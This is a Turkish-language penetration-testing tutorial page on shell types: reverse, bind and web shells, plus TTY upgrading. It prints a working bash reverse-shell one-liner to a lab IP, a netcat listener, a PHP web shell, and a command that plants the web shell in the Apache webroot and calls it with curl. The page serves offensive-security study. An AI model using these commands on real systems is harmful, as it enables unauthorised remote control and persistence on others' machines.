---
icon: material/circle-small
search:
  boost: 2
---

# Types of Shells

## Reverse Shell

Reverse shell, kontrol elde etmenin en hızlı ve en kolay yöntemi olduğundan en yaygın shell türüdür. Saldırı makinemizdeki dinleyiciye geri bağlantı başlatır.

### Netcat Listener

Reverse shell almak için ilk adım seçilen bir port için Netcat dinleyicisi başlatmaktır:

```bash
nc -l -v -n -p 2222
```

| Flag | Description |
|:---|:---|
| `-l` | Bir bağlantının bağlanması beklenir. |
| `-v` | Ayrıntılı mod kullanılır. |
| `-n` | Bağlantıyı hızlandırmak için DNS çözümlemesi devre dışı bırakılır. |
| `-p` | Port numarası belirtilir. |

### Reverse Shell Command

[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings) reposunda bulunan [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) sayfasında reverse shell için kullanılabilecek çeşitli komutların bir listesi bulunur.

Aşağıda örnek bir reverse shell komutu verilmiştir:

```bash
bash -c 'bash -i &> /dev/tcp/10.0.2.6/2222 0<&1'
```

Bu komut hedef makinede çalıştırıldığında Netcat tarafında bağlantı alınabilir.

## Bind Shell

Hedef bilgisayardaki belirli bir porta bağlanır ve saldırı makinesinden bağlantı bekler. [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings) sayfasında bind shell için kullanılabilecek çeşitli komutların bir listesi bulunur.

## Upgrading TTY

Uzak bir shell bağlantısında yalnızca komut yazabilir veya ++backspace++ işlevini kullanabiliriz. Ancak komutlarımızı düzenlemek için metin imlecini sola veya sağa hareket ettiremeyiz ya da komut geçmişine erişmek için yukarı aşağı hareket edemeyiz. Bu işlevleri kullanabilmek amacıyla TTY yükseltmesi gerçekleştirilir. Bunun için mevcut makinedeki TTY, uzak makinedeki TTY ile eşleştirilmelidir.

TTY yükseltmek için kullanılan yöntemlerden biri python/stty yöntemidir. Bu yöntemde Netcat ile dinleme gerçekleştirdiğimiz shell Full TTY yapılır:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Bu komutun ardından shell arka plana taşınır. Bu şekilde yerel terminale geri dönülür. Sonrasında aşağıdaki komut ile echo özelliği devre dışı bırakılır:

```bash
stty raw -echo
```

Bu işlemin ardından Netcat shell tekrar ön plana taşınır:

```bash
fg
```

Son olarak yeni bir sekmede başka bir terminal açılır. Aşağıdaki komutlar ile terminale ait profil ve boyut bilgileri görüntülenir:

```bash
echo $TERM && stty size
```

Burada edinilen bilgiler Netcat shell içerisine kopyalanır:

```bash
export TERM=xterm-256color && stty rows 30 columns 120
```

## Web Shell

Web shell, HTTP GET veya HTTP POST istek parametreleri aracılığıyla verilen komutları kabul eder, bu komutları yürütür ve sonuçları web sayfasına yazdırır.

### Writing a Web Shell

Bir web shell script genellikle kısa olan, tek satırlık (one-liner) bir komut dosyasıdır. Aşağıda PHP için örnek bir web shell script verilmiştir:

```php
<?php system($_REQUEST["cmd"]); ?>
```

### Uploading a Web Shell

Web shell dosyasını web tarayıcısı aracılığıyla yürütmek için, script, uzak bilgisayarın web köküne (webroot) yerleştirilmelidir.

Aşağıda bazı web sunucuları için varsayılan web kökleri verilmiştir:

| Web Server | Default Webroot |
|:---|:---|
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | c:\inetpub\wwwroot\ |
| XAMPP | C:\xampp\htdocs\ |

Örneğin Apache çalıştıran bir Linux bilgisayarına saldırıyorsak aşağıdaki komutu kullanabiliriz:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Accessing a Web Shell

Parametre olarak `id` değeri verilerek `id` komutunun çalıştırılması sağlanabilir:

```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

```text title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bir web shell port üzerinde yeni bir bağlantı açmaz. Bu sayede bazı güvenlik duvarı kısıtlamaları atlanabilir. Ayrıca hedef bilgisayar yeniden başlatılsa bile, web shell, yerinde kalmaya devam eder.
